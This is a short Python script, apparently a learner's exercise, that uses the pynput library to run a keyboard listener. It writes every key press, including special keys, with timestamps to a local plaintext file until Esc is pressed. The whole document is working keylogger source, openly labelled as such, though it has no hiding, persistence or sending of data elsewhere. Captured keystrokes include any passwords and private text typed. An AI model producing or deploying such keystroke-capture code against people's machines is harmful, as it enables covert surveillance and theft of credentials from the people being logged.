import os
from pynput import keyboard
print("Pynput is successfully installed!")

from datetime import datetime

# File to store the logged keys
log_file = "key_log_extended.txt"

def write_to_file(log_data):
    """Writes data to the log file"""
    try:
        with open(log_file, "a") as f:
            f.write(log_data)
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_press(key):
    """Handles key press events"""
    try:
        if hasattr(key, 'char'):  # For regular keys
            log_entry = f"{datetime.now()} - Key pressed: {key.char}\n"
        else:  # For special keys
            log_entry = f"{datetime.now()} - Special key pressed: {key}\n"
        write_to_file(log_entry)
    except Exception as e:
        print(f"Error on_press: {e}")

def on_release(key):
    """Handles key release events and stops the keylogger if Esc is pressed"""
    if key == keyboard.Key.esc:
        log_entry = f"{datetime.now()} - Keylogger stopped.\n"
        write_to_file(log_entry)
        return False  # Stop listener

if __name__ == "__main__":
    # Log the start of the keylogger session
    log_entry = f"{datetime.now()} - Keylogger started.\n"
    write_to_file(log_entry)

    # Set up and start the keyboard listener
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"Error setting up the listener: {e}")
        write_to_file(f"{datetime.now()} - Error: {e}\n")

    # Log the end of the session
    log_entry = f"{datetime.now()} - Keylogger ended.\n"
    write_to_file(log_entry)